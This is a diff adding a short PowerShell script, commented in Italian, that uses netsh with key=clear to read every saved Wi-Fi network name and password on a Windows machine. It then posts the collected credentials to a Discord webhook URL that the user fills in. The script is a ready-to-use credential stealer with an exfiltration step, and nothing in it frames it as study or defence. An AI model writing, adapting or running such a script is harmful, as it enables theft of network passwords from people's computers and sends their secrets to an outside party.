@@ -1,0 +1,41 @@
+# URL del webhook Discord
+# Puoi creare un webhook da Discord andando su "Impostazioni del canale > Integrazioni > Webhook".
+$webhookUrl = "INSERISCI_IL_TUO_URL_WEBHOOK_QUI"
+
+# Messaggio iniziale
+$outputContent = "Elenco delle reti Wi-Fi salvate e relative password:`n"
+
+# Ottieni l'elenco dei profili Wi-Fi salvati
+$profiles = netsh wlan show profiles | Select-String "Tutti i profili utente" | ForEach-Object {
+    $_.ToString().Split(':')[1].Trim()
+}
+
+# Controlla i profili trovati
+if ($profiles.Count -eq 0) {
+    $outputContent += "Nessun profilo Wi-Fi salvato trovato.`n"
+} else {
+    foreach ($profile in $profiles) {
+        # Scrivi il nome della rete
+        $outputContent += "SSID: $profile`n"
+        $key = netsh wlan show profile name="$profile" key=clear | Select-String "Contenuto chiave" | ForEach-Object {
+            $_.ToString().Split(':')[1].Trim()
+        }
+
+        if ($key) {
+            $outputContent += "Password: $key`n"
+        } else {
+            $outputContent += "Password: Non disponibile`n"
+        }
+        $outputContent += "----------------------`n"
+    }
+}
+
+# Invia il messaggio al webhook Discord
+$body = @{
+    content = $outputContent
+} | ConvertTo-Json -Depth 10
+
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json'
+
+# Messaggio finale
+Write-Host "Operazione completata. Dati inviati al webhook Discord."
